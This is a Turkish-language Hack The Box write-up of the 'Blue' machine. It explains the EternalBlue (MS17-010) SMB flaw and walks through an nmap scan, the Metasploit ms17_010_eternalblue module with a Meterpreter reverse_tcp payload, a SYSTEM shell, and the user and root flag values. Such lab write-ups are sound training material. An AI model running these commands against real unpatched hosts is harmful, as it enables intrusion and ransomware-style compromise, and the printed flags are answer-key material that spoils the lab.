<img width="1178" height="748" alt="1_T_XQP99E8f46wWIFNwOsLA" src="https://github.com/user-attachments/assets/acf1215d-13c2-4328-93ae-8614202c71f8" />

## About

Blue, Hack The Box üzerindeki muhtemelen en basit makinelerden biri olsa da, aslında oldukça ciddi bir konuya işaret ediyor: **EternalBlue**. Bu exploit ilk sızdırıldığı günden bu yana birçok büyük çaplı ransomware ve crypto-mining saldırısında kullanıldı (WannaCry ve NotPetya bunların en bilinenleri). Basit bir makine gibi görünse de, arkasındaki zafiyetin gerçek dünyada yarattığı hasar hiç de küçük değil.

---

## Keşif

Her zamanki gibi ilk iş kapsamlı bir nmap taraması:

```
nmap -sS -A -p- -T5 10.129.49.255
```

<img width="1000" height="777" alt="nmap" src="https://github.com/user-attachments/assets/590ee7fd-804a-4b36-815d-9f7cec3758b9" />


Burada iki şey hemen gözüme çarptı:

1. **445 portu açık** ve servis bilgisi net bir şekilde `Windows 7 Professional 7601 Service Pack 1` diyor.
2. Nmap'in OS tespiti de aynı aralığı işaret ediyor: **Windows 7 SP1 / Server 2008 R2**.

Bu kombinasyonu görünce aklıma direkt **EternalBlue (MS17-010)** geldi. SMB üzerinde çalışan, yamalanmamış eski bir Windows sürümü

## EternalBlue Nedir?

Kısaca değinmek gerekirse: **EternalBlue**, Microsoft'un SMBv1 protokolü implementasyonundaki bir buffer overflow zafiyetini istismar eden bir exploit. Zafiyetin kök nedeni, SMB sunucusunun belirli bir paket türünü (özellikle Transaction2 komutlarını) işlerken bellek sınırlarını doğru kontrol etmemesi. Saldırgan bu açığı kullanarak kernel belleğine kendi kodunu yazdırabiliyor ve bunu çalıştırabiliyor.

Bu exploit orijinal olarak NSA tarafından geliştirilmiş, 2017'de Shadow Brokers grubu tarafından sızdırılmış ve kısa süre sonra WannaCry ve NotPetya gibi küresel çaplı ransomware saldırılarında silah olarak kullanılmıştı.

**Etkilenen sürümler** başlıca şunlar:

- Windows Vista
- Windows 7 (tüm SP'ler dahil, MS17-010 patch'i öncesi)
- Windows 8.1
- Windows Server 2008 / 2008 R2
- Windows Server 2012 / 2012 R2

Microsoft, Mart 2017'de MS17-010 güvenlik bülteniyle bu açığı kapatmıştı, ama yamalanmamış makineler yıllar sonra bile hâlâ karşımıza çıkabiliyor.

En kritik nokta şu: EternalBlue başarılı şekilde çalıştığında, hedef sistemde authentication'a hiç ihtiyaç duymadan doğrudan **NT AUTHORITY\SYSTEM** yetkisiyle kod çalıştırabiliyorsunuz. Yani normalde bir saldırganın privilege escalation için harcayacağı onca efor, bu zafiyet sayesinde tek adımda, en baştan en yüksek yetkiyle sonuçlanıyor. Bu da onu bu kadar tehlikeli ve popüler yapan asıl sebep.

---

## Exploitation

Nmap sonuçları EternalBlue ihtimalini güçlü şekilde işaret ettiği için doğrudan Metasploit üzerinden ilerledim.

```
msf > use exploit/windows/smb/ms17_010_eternalblue
```

Modülün seçeneklerine baktım:

```
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s)
   RPORT          445              yes       The target port (TCP)
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   LHOST     10.0.2.15        yes       The listen address
   LPORT     4444             yes       The listen port
```

Gerekli parametreleri ayarladım:

```
set RHOSTS 10.129.49.255
set LHOST 10.10.14.187
```

Ve exploiti çalıştırdım:

```
msf exploit(windows/smb/ms17_010_eternalblue) > run

```

<img width="1006" height="723" alt="msfconsole" src="https://github.com/user-attachments/assets/4be4986e-0f0b-4a7e-94fc-4083dc457164" />

Exploit sorunsuz çalıştı ve bir Meterpreter oturumu açıldı. Kullanıcı yetkimi kontrol ettiğimde tam olarak beklediğim şeyi gördüm:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Tek bir exploit çalıştırmasıyla, herhangi bir credential kullanmadan, herhangi bir privilege escalation adımına ihtiyaç duymadan direkt olarak sistemin en yetkili hesabı olan **SYSTEM** olarak içeri girmiştim. EternalBlue'nun bu kadar tehlikeli sayılmasının sebebi tam olarak bu — authentication bypass + kernel-level code execution tek pakette geliyor.

---

## Flag'ler

Oturumu aldıktan sonra dosya sistemine göz gezdirdim.

Önce normal kullanıcı klasörüne baktım:

```
meterpreter > cd C:\\Users\\haris\\Desktop
meterpreter > ls

Listing: C:\Users\haris\Desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  34    fil   2026-08-29 16:23:20 -0400  user.txt
```

```
meterpreter > cat user.txt
fba27648e4950c5cf0d1fbb21fbe3e90
```

<img width="568" height="195" alt="flag1" src="https://github.com/user-attachments/assets/06f284e1-bed5-4b5b-8a78-b44eb795b502" />

**User flag** elde edildi.


Zaten SYSTEM yetkisinde olduğum için Administrator'ın masaüstüne geçmek de bir sorun olmadı:

```
meterpreter > cd C:\\Users\\Administrator\\Desktop
meterpreter > ls

Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  34    fil   2026-08-29 16:23:20 -0400  root.txt
```

```
meterpreter > cat root.txt
cc7bc81ec0ab8e0b0534a7fa4eabbb27
```

<img width="571" height="199" alt="flag2" src="https://github.com/user-attachments/assets/c18d59fe-85cf-4019-9210-6ed0849ae2d7" />

**Root flag** de böylece elimizdeydi.
